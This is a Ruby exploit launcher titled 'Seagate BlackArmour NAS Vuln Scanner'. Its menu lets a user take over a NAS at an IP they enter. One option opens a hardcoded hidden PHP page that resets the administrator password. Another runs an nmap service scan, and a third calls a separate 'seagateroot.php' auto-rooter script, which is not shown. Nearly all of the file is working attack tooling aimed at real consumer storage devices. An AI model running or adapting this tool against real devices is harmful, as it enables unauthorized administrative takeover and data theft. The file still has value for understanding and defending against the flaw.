require 'launchy'
require 'progress_bar'
require 'formatador'
require 'nmap/program'

print <<-eos
--------------------------------------------------

Seagate BlackArmour NAS Vuln Scanner.

Created by Barry Malone:

https://github.com/Barry-malone
__________________________________________________
eos

 puts "\n"

def mainMenu
       puts Formatador.display_line '[blue]What would you like to try:[/]

      [green] 1) Administrator Password Reset Vulnerability[/]
      [green] 2) Run a Service Scan[/]
      [green] 3) Run Auto Rooter Script[/]'
      puts "\n"
      puts Formatador.display_line '[light_blue]Press 4 to quit[/]'

case gets.strip

when "1"
 bar = ProgressBar.new 

 puts "Enter the NAS ip address:"
 device_ip = gets.chomp.to_s

 sleep (2)

100.times do
  sleep 0.1
  bar.increment!
end

 sleep(3)

Launchy.open("http://#{device_ip}/d41d8cd98f00b204e9800998ecf8427e.php")

when "2"

puts "Enter the NAS ip address:"
 device_ip = gets.chomp.to_s

Nmap::Program.scan do |nmap|

  nmap.service_scan = true
  nmap.verbose = true

  nmap.ports = [20,21,22,23,25,80,110,443,512,522,8080,1080]
  nmap.targets = device_ip
end
    when "3"
puts "Enter the NAS ip address:"
 device_ip = gets.chomp.to_s

  command = system( "php seagateroot.php http://#{device_ip}/" )

end
end
	puts mainMenu